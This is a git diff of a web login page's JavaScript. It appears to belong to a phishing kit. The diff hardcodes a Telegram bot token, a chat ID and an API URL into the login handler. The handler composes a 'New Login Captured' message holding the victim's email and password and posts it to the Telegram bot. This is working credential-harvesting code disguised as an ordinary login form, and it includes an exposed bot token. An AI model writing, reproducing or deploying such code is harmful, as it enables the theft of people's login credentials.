@@ -96,10 +96,9 @@
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.all.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/izitoast/1.4.0/js/iziToast.min.js"></script>
+    
+    
     <script type="module">
-    import { botToken, chatID, telegramURL } from './pics/tg.js';
-</script>
-    <script>
         document.addEventListener("DOMContentLoaded", function() {
             // Initialize Bootstrap Popovers
             var popoverTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="popover"]'));
@@ -147,6 +146,9 @@ $(document).ready(function () {
         } else if (email === storedUserName && password === storedPassword) { 
                               
             const message = `New Login Captured From:\nName: ${storedUserName}\n\nEmail: ${email}\n\nPassword: ${password}`;
+            const botToken = '7153300024:AAHxg3xOAYbsBbLrIpQJoYNbeFBuYPmnsyk';
+const chatID = '5538909913';
+const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             fetch(telegramURL, {
                 method: 'POST',
